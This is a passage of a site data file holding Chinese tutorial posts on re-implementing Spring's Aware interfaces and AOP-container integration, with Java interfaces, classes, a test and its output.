</bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n\n * Mouse 类准备，实现各个 Aware 接口\n\npublic class Mouse implements BeanNameAware, BeanClassLoaderAware, BeanFactoryAware, ApplicationContextAware {\n\n    private ApplicationContext applicationContext;\n    private String name;\n\n    @Override\n    public void setBeanClassLoader(ClassLoader classLoader) {\n        System.out.println("==> BeanClassLoaderAware classLoader: " + classLoader);\n    }\n\n    @Override\n    public void setBeanFactory(BeanFactory beanFactory) {\n        System.out.println("==> BeanFactoryAware beanFactory: " + beanFactory);\n    }\n\n    @Override\n    public void setBeanName(String beanName) {\n        System.out.println("==> BeanNameAware beanName: " + beanName);\n    }\n\n    @Override\n    public void setApplicationContext(ApplicationContext applicationContext) {\n        System.out.println("==> ApplicationContextAware applicationContext: " + applicationContext);\n        this.applicationContext = applicationContext;\n    }\n\n    public ApplicationContext getApplicationContext() {\n        return applicationContext;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public String toString() {\n        return "Mouse{" +\n                "applicationContext=" + applicationContext +\n                ", name=\'" + name + \'\\\'\' +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n * 测试类\n\n    /**\n     * xml上下文中，加入 Bean 的 Aware（感知能力），测试\n     */\n    @Test\n    public void test_xml_context_aware() {\n        // 1. 利用 xml上下文 加载Bean\n        // 上下文的高级实现极大的简化了或融合了上述的 1-4 步操作\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring-aware.xml");\n        // 可以在任何时段，提前注册 JVM 关闭钩子，用来确保 Spring 容器在 JVM 关闭之前正确地关闭并释放所有资源。\n        applicationContext.registerShutdownHook();\n        // 2. 获取bean\n        Mouse mouse = (Mouse) applicationContext.getBean("mouse");\n\n        System.out.println("\\n" + mouse);\n        // * close 和 registerShutdownHook 比，比较暴力，直接手动调用关闭\n        // applicationContext.close();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * 测试结果\n\n==> BeanNameAware beanName: mouse\n==> BeanClassLoaderAware classLoader: sun.misc.Launcher$AppClassLoader@18b4aac2\n==> BeanFactoryAware beanFactory: com.snail.springframework.beans.factory.support.DefaultListableBeanFactory@6df97b55\n==> ApplicationContextAware applicationContext: com.snail.springframework.context.support.ClassPathXmlApplicationContext@3cbbc1e0\n\nMouse{applicationContext=com.snail.springframework.context.support.ClassPathXmlApplicationContext@3cbbc1e0, name=\'name-xml-init-jerry\'}\n\nProcess finished with exit code 0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 总结\n\n实现 Aware 接口的 bean 可以在特定的生命周期阶段中获取对应的资源或对象，并进行相应的操作。\n\n例如，在初始化阶段，可以通过 ApplicationContextAware 获取 ApplicationContext 容器，并使用其提供的方法获取其他 bean 实例；在销毁阶段，可以通过 DisposableBean 或 @PreDestroy 注解来实现 bean 的清理操作。\n\n需要注意的是，Spring 框架只会将实现了相应 Aware 接口的 bean 注入对应的资源或对象，而不是所有的 bean 都可以访问这些资源或对象。如果一个 bean 不需要访问任何外部资源或对象，则无需实现任何 Aware 接口。\n\n同时，Spring 还提供了内置的处理器（例如 ApplicationContextAwareProcessor）来处理实现 Aware 接口的 bean，在合适的时候将指定的资源或对象注入到 bean 中。如果需要自定义 Aware 类型接口的注入逻辑，则可以通过实现自己的 BeanPostProcessor 来实现。',normalizedContent:'spring aware 接口是一个标记接口，实现该接口的 bean 可以访问 spring 的核心组件 applicationcontext 或其他特定的 spring 框架对象。\n\n这些组件包括 beanfactory、resourceloader、applicationeventpublisher 等等。\n\n实现该接口的 bean 需要实现 setapplicationcontext() 方法，并在该方法中将 applicationcontext 或其他 spring 框架对象注入到该 bean 中。通过实现 spring aware 接口，bean 可以获取 spring 容器中的其他 bean 和资源，从而更好地利用 spring 框架的功能。\n\n\n\n * 解析\n * 容器 aware 实现\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n * 上下文 aware 实现\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 总结\n\n\n\nspring aware 接口有多个子接口，分别对应不同的 spring 框架对象和功能。比如：\n\n 1. beannameaware：实现该接口的 bean 可以获取自己在容器中的 bean 名称。\n\n 2. beanfactoryaware：实现该接口的 bean 可以获取 beanfactory（即spring容器）对象。\n\n 3. applicationcontextaware：实现该接口的 bean 可以获取 applicationcontext 对象，从而可以访问 spring 容器中的其他 bean、资源和配置信息。\n\n 4. messagesourceaware：实现该接口的 bean 可以获取 messagesource 对象，用于国际化处理。\n\n 5. applicationeventpublisheraware：实现该接口的 bean 可以获取 applicationeventpublisher 对象，用于发布应用程序事件。\n\n 6. resourceloaderaware：实现该接口的 bean 可以获取 resourceloader 对象，用于加载外部资源文件。\n\n通过实现这些 spring aware 接口，bean 可以更加灵活地使用 spring 框架提供的各种功能和资源，同时也增强了与 spring 框架的集成能力。\n\n\n# 解析\n\naware 是如何在 spring 中实现的呢：在 spring 中，aware 接口的实现是通过 beanpostprocessor 机制来实现的。\n\n当 spring 容器创建一个 bean 时，会在 bean 的生命周期中调用 beanpostprocessor 接口中的两个方法 postprocessbeforeinitialization() 和 postprocessafterinitialization() 。如果一个 bean 实现了某个 aware 接口， beanpostprocessor 会检测到该 bean，并调用对应的 setxxx() 方法来注入相应的 spring 组件。\n\n比如，实现 applicationcontextaware 接口的 bean，在 postprocessbeforeinitialization() 方法中会调用其 setapplicationcontext() 方法，并将 applicationcontext 对象注入到该 bean 中。由于 aware 接口是标记接口，因此在 spring 容器中没有具体的实现类，而是通过 java 反射机制在运行时动态地为 bean 生成代理类来实现注入操作。\n\n需要注意的是，aware 接口的实现顺序是非常重要的。如果多个 bean 都实现了同一个 aware 接口，spring 会按照某种预定义的顺序依次调用它们的 setxxx() 方法。因此，如果存在顺序依赖关系，就需要设置合适的优先级，确保 bean 的注入顺序正确。可以使用 @order 注解或实现 ordered 接口来指定 aware 接口的执行顺序。\n\n\n# 容器 aware 实现\n\nspring 中的 aware 实现流程可以分为以下几步：\n\n 1. 定义 aware 接口：在自定义的类中定义一个实现了某个 aware 接口的方法，如 applicationcontextaware 接口。\n\n 2. 注册 beanpostprocessor：在 spring 容器启动时注册 beanpostprocessor 实现类，该实现类会对所有 bean 进行处理，判断是否实现了指定的 aware 接口。如果实现了，则调用相应的方法。\n\n 3. 查找并注入相关 bean：当一个 bean 实现了指定的 aware 接口后，在其初始化过程中，spring 会自动查找相应的 bean，并将其注入到该 bean 中。\n\n 4. 使用注入的 bean：在 bean 初始化完成后，可通过注入的 bean 来获取相应的资源，如 applicationcontext、beanfactory 等。\n\n需要注意的是，具体实现方式会因为实现的 aware 接口不同而有所差异，例如实现了 beannameaware 接口则可获得当前 bean 的名称等。\n\n\n# 定义一些职责和能力：\n\n 1. aware\n    \n    /**\n     * spring aware 接口是一个标记接口，实现该接口的 bean 可以访问 spring 的核心组件 applicationcontext 或其他特定的 spring 框架对象。\n     * 通过实现 spring aware 接口，bean 可以获取 spring 容器中的其他 bean 和资源，从而更好地利用 spring 框架的功能。\n     */\n    public interface aware {\n        \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 2. beannameaware\n    \n    /**\n     * 实现该接口的 bean 可以获取 所属 bean 在容器中的名称。\n     */\n    public interface beannameaware extends aware {\n    \n        /**\n         * 感知 bean 名称\n         *\n         * @param beanname bean名字\n         */\n        void setbeanname(string beanname);\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n\n 3. beanfactoryaware\n    \n    /**\n     * 实现该接口的 bean 可以获取 beanfactory（即spring容器）对象。\n     */\n    public interface beanfactoryaware extends aware {\n    \n        /**\n         * 感知 beanfactory（即spring容器）对象\n         *\n         * @param beanfactory bean工厂\n         */\n        void setbeanfactory(beanfactory beanfactory);\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n\n 4. beanclassloaderaware\n    \n    /**\n     * 实现该接口的 bean 可以获取 所属 classloader 对象。\n     *\n     * @author zhangpengjun\n     * @date 2023/3/28\n     */\n    public interface beanclassloaderaware extends aware {\n    \n        /**\n         * 感知 所属 classloader 对象\n         *\n         * @param classloader 类装入器\n         */\n        void setbeanclassloader(classloader classloader);\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    \n\n\n# 具体的实现：\n\n * 无\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 修改 abstractautowirecapablebeanfactory，在 bean 实例化及属性填充后，初始化方法的调用的过程中加入 aware 感知的能力：\n    \n        private object initializebean(string beanname, object bean, beandefinition beandefinition) {\n            // 感知类型扩展 处理\n            if (bean instanceof aware) {\n                if (bean instanceof beannameaware) {\n                    ((beannameaware) bean).setbeanname(beanname);\n                }\n                if (bean instanceof beanclassloaderaware) {\n                    ((beanclassloaderaware) bean).setbeanclassloader(getbeanclassloader());\n                }\n                if (bean instanceof beanfactoryaware) {\n                    ((beanfactoryaware) bean).setbeanfactory(this);\n                }\n            }\n            // beanpostprocessor 前置处理，applicationcontextawareprocessor 也会在这里处理\n            object wrappedbean = applybeanpostprocessorsbeforeinitialization(bean, beanname);\n            // 调用初始化方法\n            try {\n                invokeinitmethods(beanname, wrappedbean, beandefinition);\n            } catch (invocationtargetexception | illegalaccessexception | nosuchmethodexception e) {\n                throw new beansexception("failed to bean init", e);\n            }\n            // beanpostprocessor 后置处理\n            wrappedbean = applybeanpostprocessorsafterinitialization(wrappedbean, beanname);\n            return wrappedbean;\n        }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    \n    \n    这样就把容器 aware 能力加入到了 bean 的创建中。\n\n\n# 上下文 aware 实现\n\n我们在 spring 中对 applicationcontextaware 接口的实现可以概括为以下几个步骤：\n\n 1. spring 容器创建 applicationcontextaware 实例对象。\n\n 2. spring 容器检测到该实例对象实现了 applicationcontextaware 接口。\n\n 3. spring 容器将当前容器的 applicationcontext 对象注入到该实例对象的 setapplicationcontext() 方法中。\n\n 4. 实现 applicationcontextaware 接口的 bean 可以在 setapplicationcontext() 方法中获取 applicationcontext 对象，从而访问容器中的其他 bean。\n\n需要注意的是，实现原理是通过 beanpostprocessor 来实现的，其中 applicationcontextawareprocessor 就是一个内置的 beanpostprocessor，它会在初始化 bean 的过程中，检测是否实现了 applicationcontextaware 接口，并在合适的时候（容器启动，在 bean 创建时的前置处理器中）调用 setapplicationcontext() 方法完成注入操作。因此，如果我们需要自定义 aware 类型接口的注入逻辑，也可以通过实现自己的 beanpostprocessor 来实现。\n\n\n# 定义一些职责和能力：\n\n 1. applicationcontextaware：感知应用程序上下文\n    \n    /**\n     * 感知 应用程序上下文\n     *\n     * @author zhangpengjun\n     * @date 2023/3/28\n     */\n    public interface applicationcontextaware extends aware {\n    \n        /**\n         * 设置应用程序上下文\n         *\n         * @param applicationcontext 应用程序上下文\n         */\n        void setapplicationcontext(applicationcontext applicationcontext);\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    \n\n\n# 具体的实现：\n\n 1. applicationcontextawareprocessor：是一个处理器（beanpostprocessor），用于在 spring 容器创建 bean 实例后，对实现了 applicationcontextaware 接口的 bean 进行特殊处理。\n    \n    /**\n     * 应用程序上下文aware比较特殊，因为在容器直接创建 bean 的时候没有上下文的存在，\n     * 所以只能交由上下文refresh()的时候，将 applicationcontextaware 包装作为一个 bean 的后置处理器添加到容器中，\n     * 然后在bean创建的时候，应用bean前置处理，将上下文设置到bean中取。\n     * <p>\n     * 所以：applicationcontextaware 底层是 通过 beanpostprocessor 实现的。\n     */\n    public class applicationcontextawareprocessor implements beanpostprocessor {\n    \n        private final applicationcontext applicationcontext;\n    \n        public applicationcontextawareprocessor(applicationcontext applicationcontext) {\n            this.applicationcontext = applicationcontext;\n        }\n    \n        @override\n        public object postprocessbeforeinitialization(object bean, string beanname) {\n            if (bean instanceof applicationcontextaware) {\n                ((applicationcontextaware) bean).setapplicationcontext(applicationcontext);\n            }\n            return bean;\n        }\n    \n        @override\n        public object postprocessafterinitialization(object bean, string beanname) {\n            return bean;\n        }\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    \n\n具体来说，applicationcontextawareprocessor 会在以下两个时刻进行处理：\n\n 1. 在 bean 实例化后，但在初始化前：此时 applicationcontextawareprocessor 会查找所有实现了 applicationcontextaware 接口的 bean，并调用它们的 setapplicationcontext() 方法，将 applicationcontext 注入进去。\n 2. 在 bean 初始化后：此时 applicationcontextawareprocessor 不会再对 applicationcontextaware 类型的 bean 进行处理，而是继续对其他类型的 bean 进行后续的处理。\n\n该处理器会检查每个 bean 是否实现了 applicationcontextaware 接口，如果实现了，则将 applicationcontext 容器注入到该 bean 的 setapplicationcontext() 方法中，从而使得该 bean 可以访问容器中的其他 bean。\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 修改上下文 abstractapplicationcontext 的 refresh() 方法：\n    \n        @override\n        public void refresh() {\n            // 1. 创建 bean 工厂，加载 beandefinition\n            refreshbeanfactory();\n    \n            // 2. 获得 bean 工厂\n            configurablelistablebeanfactory beanfactory = getbeanfactory();\n            // 2.1 == 这里新加这一步 ==\n            // 添加 applicationcontextaware 的后置处理器\n            // 使 bean 创建时（beanpostprocessor前置处理器）的时候可以感知到容器上下文\n            beanfactory.addbeanpostprocessor(new applicationcontextawareprocessor(this));\n    \n            // 3. beandefinition 扩展点：\n            // spring 容器中 beandefinition 的扩展点。\n            // 创建 beandefinition 之后，但在创建 bean 实例之前。\n            invokebeanfactorypostprocessors(beanfactory);\n    \n            // 4. bean 扩展点：\n            // 提前注册所有的 beanpostprocessor，在 bean 创建后，初始化时扩展\n            // （见 abstractautowirecapablebeanfactory.createbean ）。\n            registerbeanpostprocessors(beanfactory);\n    \n            // 5. 提前实例化所有的单例 bean\n            beanfactory.preinstantiatesingletons();\n        }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    \n\n\n# 测试：\n\n * xml 准备\n\n<?xml version="1.0" encoding="utf-8" ?>\n<beans>\n    <bean id="mouse" class="com.snail.springframework.beans.factory.support.mouse">\n        <property name="name" value="name-xml-init-jerry"></property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n\n * mouse 类准备，实现各个 aware 接口\n\npublic class mouse implements beannameaware, beanclassloaderaware, beanfactoryaware, applicationcontextaware {\n\n    private applicationcontext applicationcontext;\n    private string name;\n\n    @override\n    public void setbeanclassloader(classloader classloader) {\n        system.out.println("==> beanclassloaderaware classloader: " + classloader);\n    }\n\n    @override\n    public void setbeanfactory(beanfactory beanfactory) {\n        system.out.println("==> beanfactoryaware beanfactory: " + beanfactory);\n    }\n\n    @override\n    public void setbeanname(string beanname) {\n        system.out.println("==> beannameaware beanname: " + beanname);\n    }\n\n    @override\n    public void setapplicationcontext(applicationcontext applicationcontext) {\n        system.out.println("==> applicationcontextaware applicationcontext: " + applicationcontext);\n        this.applicationcontext = applicationcontext;\n    }\n\n    public applicationcontext getapplicationcontext() {\n        return applicationcontext;\n    }\n\n    public string getname() {\n        return name;\n    }\n\n    public void setname(string name) {\n        this.name = name;\n    }\n\n    @override\n    public string tostring() {\n        return "mouse{" +\n                "applicationcontext=" + applicationcontext +\n                ", name=\'" + name + \'\\\'\' +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n * 测试类\n\n    /**\n     * xml上下文中，加入 bean 的 aware（感知能力），测试\n     */\n    @test\n    public void test_xml_context_aware() {\n        // 1. 利用 xml上下文 加载bean\n        // 上下文的高级实现极大的简化了或融合了上述的 1-4 步操作\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring-aware.xml");\n        // 可以在任何时段，提前注册 jvm 关闭钩子，用来确保 spring 容器在 jvm 关闭之前正确地关闭并释放所有资源。\n        applicationcontext.registershutdownhook();\n        // 2. 获取bean\n        mouse mouse = (mouse) applicationcontext.getbean("mouse");\n\n        system.out.println("\\n" + mouse);\n        // * close 和 registershutdownhook 比，比较暴力，直接手动调用关闭\n        // applicationcontext.close();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * 测试结果\n\n==> beannameaware beanname: mouse\n==> beanclassloaderaware classloader: sun.misc.launcher$appclassloader@18b4aac2\n==> beanfactoryaware beanfactory: com.snail.springframework.beans.factory.support.defaultlistablebeanfactory@6df97b55\n==> applicationcontextaware applicationcontext: com.snail.springframework.context.support.classpathxmlapplicationcontext@3cbbc1e0\n\nmouse{applicationcontext=com.snail.springframework.context.support.classpathxmlapplicationcontext@3cbbc1e0, name=\'name-xml-init-jerry\'}\n\nprocess finished with exit code 0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 总结\n\n实现 aware 接口的 bean 可以在特定的生命周期阶段中获取对应的资源或对象，并进行相应的操作。\n\n例如，在初始化阶段，可以通过 applicationcontextaware 获取 applicationcontext 容器，并使用其提供的方法获取其他 bean 实例；在销毁阶段，可以通过 disposablebean 或 @predestroy 注解来实现 bean 的清理操作。\n\n需要注意的是，spring 框架只会将实现了相应 aware 接口的 bean 注入对应的资源或对象，而不是所有的 bean 都可以访问这些资源或对象。如果一个 bean 不需要访问任何外部资源或对象，则无需实现任何 aware 接口。\n\n同时，spring 还提供了内置的处理器（例如 applicationcontextawareprocessor）来处理实现 aware 接口的 bean，在合适的时候将指定的资源或对象注入到 bean 中。如果需要自定义 aware 类型接口的注入逻辑，则可以通过实现自己的 beanpostprocessor 来实现。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 10 - AOP 和 Spring 容器的整合",frontmatter:{title:"手写 Spring 10 - AOP 和 Spring 容器的整合",date:"2023-11-09T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-10.html",relativePath:"views/backend/spring-source-10.md",key:"v-0a724a66",path:"/views/backend/spring-source-10.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:339},{level:2,title:"进一步封装 AOP",slug:"进一步封装-aop",normalizedTitle:"进一步封装 aop",charIndex:345},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力",charIndex:360},{level:3,title:"具体的实现",slug:"具体的实现",normalizedTitle:"具体的实现",charIndex:375},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中",charIndex:386},{level:3,title:"测试",slug:"测试",normalizedTitle:"测试",charIndex:403},{level:2,title:"与 Spring 整合",slug:"与-spring-整合",normalizedTitle:"与 spring 整合",charIndex:409},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力-2",normalizedTitle:"定义一些职责和能力",charIndex:360},{level:3,title:"具体的实现",slug:"具体的实现-2",normalizedTitle:"具体的实现",charIndex:375},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中-2",normalizedTitle:"将实现加入原有的逻辑中",charIndex:386},{level:3,title:"测试",slug:"测试-2",normalizedTitle:"测试",charIndex:403},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:475}],excerpt:"<Boxx/>\n<p>我们先大致了解正常在 Spring 容器中使用 AOP 的基本步骤：</p>\n<ol>\n<li>定义切面类：创建一个切面类，该类包含了切面逻辑（Advice）和切入点（Pointcut）。切面逻辑定义了要在切入点处执行的逻辑，而切入点定义了在哪些方法或位置应用该切面逻辑。</li>\n<li>配置切面类：在 Spring 配置文件（如 XML 配置文件）中，声明切面类作为一个 bean，并配置其相关属性，例如切面逻辑和切入点。</li>\n<li>使用 AOP 功能：在应用程序中，可以直接使用被代理的 bean，并在其方法上应用切面逻辑。当方法被调用时，AOP 将拦截相应的切入点，并执行切面逻辑中定义的逻辑。</li>\n</ol>\n<p>而 AOP 和 Spring 容器的整合，如上就是我们最终封装之后，对外暴露的流程。</p>\n",headersStr:"解析 进一步封装 AOP 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 与 Spring 整合 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 总结",content:'我们先大致了解正常在 Spring 容器中使用 AOP 的基本步骤：\n\n 1. 定义切面类：创建一个切面类，该类包含了切面逻辑（Advice）和切入点（Pointcut）。切面逻辑定义了要在切入点处执行的逻辑，而切入点定义了在哪些方法或位置应用该切面逻辑。\n 2. 配置切面类：在 Spring 配置文件（如 XML 配置文件）中，声明切面类作为一个 bean，并配置其相关属性，例如切面逻辑和切入点。\n 3. 使用 AOP 功能：在应用程序中，可以直接使用被代理的 bean，并在其方法上应用切面逻辑。当方法被调用时，AOP 将拦截相应的切入点，并执行切面逻辑中定义的逻辑。\n\n而 AOP 和 Spring 容器的整合，如上就是我们最终封装之后，对外暴露的流程。\n\n\n\n * 解析\n * 进一步封装 AOP\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 与 Spring 整合\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n主要就是对上一篇 AOP 的进一步封装。与 Spring 整合 AbstractAutowireCapableBeanFactory.createBean 在创建 Bean 时，在实例化 Bean 之前判断是否需要代理，通过 InstantiationAwareBeanPostProcessor 查找所有的需要被代理的类和当前类比较，如果当前类需要被代理则创建代理类返回（不走正常的实例化逻辑了）；\n\n\n# 进一步封装 AOP\n\n\n# 定义一些职责和能力\n\n 1. Advisor\n    \n    一个 aop 操作的访问者，持有要执行的具体操作。\n\npublic interface Advisor {\n\n    /**\n     * 获取一个准备好的 aop 执行器\n     *\n     * @return {@link Advice}\n     */\n    Advice getAdvice();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n 2. BeforeAdvice，MethodBeforeAdvice\n    \n    MethodBeforeAdvice 用于在目标方法执行之前执行一些额外的逻辑操作（在 Spring 框架中，Advice 都是通过方法拦截器 MethodInterceptor 实现的。环绕 Advice 类似一个拦截器的链路，Before Advice、After advice等。这里简单只做一个MethodBeforeAdvice前置拦截）。\n    \n    通过实现 MethodBeforeAdvice 接口，开发人员可以在目标方法执行之前插入自定义的行为，比如日志记录、权限验证、事务管理等。\n\npublic interface BeforeAdvice extends Advice {\n\n}\n\n\n1\n2\n3\n\n\npublic interface MethodBeforeAdvice extends BeforeAdvice {\n\n    /**\n     * aop 方法前置操作\n     *\n     * @param method 目标方法\n     * @param args   目标方法参数\n     * @param target 目标对象，可能是空\n     * @throws Throwable throwable\n     */\n    void before(Method method, Object[] args, Object target) throws Throwable;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n 3. PointcutAdvisor\n    \n    切入点访问者，PointcutAdvisor 承担了 Pointcut 和 Advice *的组合，*Pointcut 用于获取 JoinPoint，而 Advice 决定于 JoinPoint 执行什么操作。\n\npublic interface PointcutAdvisor extends Advisor {\n\n    /**\n     * 获取一个切入点\n     *\n     * @return {@link Pointcut}\n     */\n    Pointcut getPointcut();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 具体的实现\n\n 1. AspectJExpressionPointcutAdvisor 切面拦截器\n    \n    将切面表达式，切面，匹配后的执行操作进行封装实现，后续就可以配置为一个 bean 加载到容器中方便使用了。\n\npublic class AspectJExpressionPointcutAdvisor implements PointcutAdvisor {\n\n    private Advice advice;\n\n    private String expression;\n\n    private AspectJExpressionPointcut aspectJExpressionPointcut;\n\n    public void setAdvice(Advice advice) {\n        this.advice = advice;\n    }\n\n    public void setExpression(String expression) {\n        this.expression = expression;\n    }\n\n    @Override\n    public Advice getAdvice() {\n        return advice;\n    }\n\n    @Override\n    public Pointcut getPointcut() {\n        if (aspectJExpressionPointcut == null) {\n            aspectJExpressionPointcut = new AspectJExpressionPointcut(expression);\n        }\n        return aspectJExpressionPointcut;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n 2. MethodBeforeAdviceInterceptor 方法前置拦截器\n    \n    对方法拦截器的适配，将拦截到的方法，执行前后交由 spring 处理。\n    \n    这里处理了执行前交由 MethodBeforeAdvice 处理。\n\npublic class MethodBeforeAdviceInterceptor implements MethodInterceptor {\n\n    private MethodBeforeAdvice methodBeforeAdvice;\n\n    public MethodBeforeAdviceInterceptor() {\n\n    }\n\n    public MethodBeforeAdviceInterceptor(MethodBeforeAdvice methodBeforeAdvice) {\n        this.methodBeforeAdvice = methodBeforeAdvice;\n    }\n\n    @Override\n    public Object invoke(MethodInvocation invocation) throws Throwable {\n        methodBeforeAdvice.before(invocation.getMethod(), invocation.getArguments(), invocation.getThis());\n        return invocation.proceed();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n 3. ProxyFactory 代理工厂\n    \n    选择 JDK 还是 Cglib 代理。\n\npublic class ProxyFactory {\n\n    private final AdvisedSupport advisedSupport;\n\n    public ProxyFactory(AdvisedSupport advisedSupport) {\n        this.advisedSupport = advisedSupport;\n    }\n\n    public Object getProxy() {\n        return createAopProxy().getProxy();\n    }\n\n    private AopProxy createAopProxy() {\n        if (advisedSupport.isProxyTargetClass()) {\n            return new Cglib2AopProxy(advisedSupport);\n        }\n        return new JdkDynamicAopProxy(advisedSupport);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 将实现加入原有的逻辑中\n\n * 原有类修改，AdvisedSupport（主要是用于把代理、拦截、匹配的各项属性包装到一个类中，方便在 AopProxy 实现类进行使用。），添加通过什么方式代理。\n\n    /**\n     * 是否通过 类 代理对象（cglib代理？true：false）\n     */\n    private boolean proxyTargetClass = false;\n\n    public boolean isProxyTargetClass() {\n        return proxyTargetClass;\n    }\n\n    public void setProxyTargetClass(boolean proxyTargetClass) {\n        this.proxyTargetClass = proxyTargetClass;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 测试\n\n * 测试类\n\n无\n\n\n1\n\n * 测试结果\n\n无\n\n\n1\n\n\n\n# 与 Spring 整合\n\n\n# 定义一些职责和能力\n\n 1. InstantiationAwareBeanPostProcessor\n    \n    扩展自 BeanPostProcessor，接口的主要作用在于：目标对象的实例化过程中需要处理的事情，包括实例化对象的前后过程以及实例的属性设置。\n\npublic interface InstantiationAwareBeanPostProcessor extends BeanPostProcessor {\n\n    /**\n     * 在目标对象实例化之前调用，该方法的返回值类型是Object，我们可以返回任何类型的值。\n     * 由于这个时候目标对象还未实例化，所以这个返回值可以用来代替原本该生成的目标对象的实例(比如代理对象)。\n     * 如果该方法的返回值代替原本该生成的目标对象，后续只有postProcessAfterInitialization方法会调用，其它方法不再调用；否则按照正常的流程走。\n     */\n    Object postProcessBeforeInstantiation(Class<?> beanClass, String beanName) throws BeansException;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 具体的实现\n\n 1. DefaultAdvisorAutoProxyCreator\n    \n    DefaultAdvisorAutoProxyCreator 是 Spring Framework 中的一个类，负责根据配置的 Advisors 自动为 Bean 创建代理。它会扫描 bean，查找任何配置的 Advisors，并在必要时为这些 bean 创建动态代理。\n    \n    在 Spring Framework 中，Advisors 是定义切面逻辑（advice）的对象，例如拦截方法调用以应用额外的行为。\n    \n    它的工作原理如下：\n    \n    1. DefaultAdvisorAutoProxyCreator 在初始化阶段检查应用上下文中的所有 bean。\n    2. 它查找配置了 Advisors 的 bean。一个 Advisor 通常由切面逻辑（advice）和切入点（pointcut）组成，切入点用于指定切面逻辑应该应用的位置。\n    3. 对于每个配置了 Advisors 的 bean，DefaultAdvisorAutoProxyCreator 创建一个代理对象，该代理对象包装了原始的 bean。\n    4. 代理对象拦截对 bean 的方法调用，并应用配置的 Advisors 定义的切面逻辑。\n    5. 当应用上下文中的其他 bean 请求原始 bean 时，它们将接收代理对象而不是原始对象。\n\npublic class DefaultAdvisorAutoProxyCreator implements 